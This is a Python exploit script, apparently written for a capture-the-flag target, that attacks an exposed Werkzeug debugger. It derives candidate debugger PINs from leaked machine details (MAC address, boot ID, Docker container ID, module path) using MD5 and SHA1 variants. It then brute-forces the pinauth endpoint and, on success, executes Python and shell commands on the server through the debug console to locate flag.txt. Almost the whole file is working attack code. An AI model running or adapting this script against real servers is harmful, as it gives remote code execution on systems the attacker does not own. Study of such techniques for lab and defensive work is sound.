"""Test Werkzeug PINs and get RCE to find flag.txt."""
import requests
import hashlib
import re
import itertools

T = "http://10.82.168.213"
SECRET = "OTPd3q771BpLTWzmQWYb"

# Known values
username = "root"
modname = "flask.app"
appname = "Flask"
mod_path = "/usr/local/lib/python3.10/site-packages/flask/app.py"
mac_int = 2485378088962  # 02:42:ac:14:00:02
boot_id = "39ee0072-c5ed-43ec-9989-4b4abfa2df38"
docker_id = "77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca"

# Generate all PIN variants
pins = set()

# For Werkzeug 0.16.0 (old), the algorithm is in werkzeug/debug/__init__.py:
# It uses MD5 hash of concatenated bits
# private_bits = [str(uuid.getnode()), get_machine_id()]
# where get_machine_id() on Linux reads /etc/machine-id or /proc/sys/kernel/random/boot_id
# For Docker: also appends the Docker container ID from /proc/self/cgroup

machine_ids = [
    boot_id,
    docker_id,
    boot_id + docker_id,
]

for mid in machine_ids:
    # Werkzeug 0.16.0 method
    h = hashlib.md5()
    for bit in [username, modname, appname, str(mac_int), mid]:
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    num = f"{int(h.hexdigest(), 16):09d}"[:9]
    pin = f"{num[:3]}-{num[3:6]}-{num[6:]}"
    pins.add(pin)

    # Also try SHA1 (newer versions)
    h2 = hashlib.sha1()
    for bit2 in itertools.chain(
        [username, modname, appname, mod_path],
        [str(mac_int), mid]
    ):
        if not bit2:
            continue
        if isinstance(bit2, str):
            bit2 = bit2.encode("utf-8")
        h2.update(bit2)
    h2.update(b"cookiesalt")
    h3 = hashlib.sha1()
    h3.update(h2.digest())
    h3.update(b"pinsalt")
    num2 = f"{int(h3.hexdigest(), 16):09d}"[:9]
    pin2 = f"{num2[:3]}-{num2[3:6]}-{num2[6:]}"
    pins.add(pin2)

# Also try with the Werkzeug 0.16 style - it concatenates bits differently
# Looking at Werkzeug 0.16 source: the bits are joined with |
for mid in machine_ids:
    bits_str = "|".join([username, modname, appname, str(mac_int), mid])
    h = hashlib.md5(bits_str.encode()).hexdigest()
    num = f"{int(h, 16):09d}"[:9]
    pin = f"{num[:3]}-{num[3:6]}-{num[6:]}"
    pins.add(pin)

print(f"[*] Testing {len(pins)} PIN variants against secret {SECRET}...")

for pin in sorted(pins):
    clean_pin = pin.replace("-", "")
    auth_url = f"{T}?__debugger__=yes&cmd=pinauth&pin={clean_pin}&s={SECRET}"
    r = requests.get(auth_url, timeout=8)
    status = "OK" if "true" in r.text.lower() else "FAIL"
    print(f"  PIN {pin} ({clean_pin}): {r.text.strip()} [{status}]")
    
    if "true" in r.text.lower():
        print(f"\n>>> PIN ACCEPTED: {pin} <<<\n")
        
        # Execute commands to find flag
        cmds = [
            "import os; print(os.listdir('/usr/src/app'))",
            "import os; print([os.path.join(r,f) for r,d,files in os.walk('/usr/src') for f in files if f.endswith('.txt')])",
            "__import__('os').popen('find /usr/src -name *.txt').read()",
        ]
        
        for cmd in cmds:
            exec_url = f"{T}?__debugger__=yes&cmd={requests.utils.quote(cmd)}&frm=0&s={SECRET}"
            r2 = requests.get(exec_url, timeout=8)
            clean = re.sub(r'<[^>]+>', ' ', r2.text).strip()
            print(f">>> {cmd}")
            print(f"    {clean[:500]}")
            print()
        break

# Also try with dashes
print("\n[*] Also trying PINs with dashes...")
for pin in sorted(pins):
    auth_url = f"{T}?__debugger__=yes&cmd=pinauth&pin={pin}&s={SECRET}"
    r = requests.get(auth_url, timeout=8)
    if "true" in r.text.lower():
        print(f">>> PIN WITH DASHES ACCEPTED: {pin} <<<")
        break
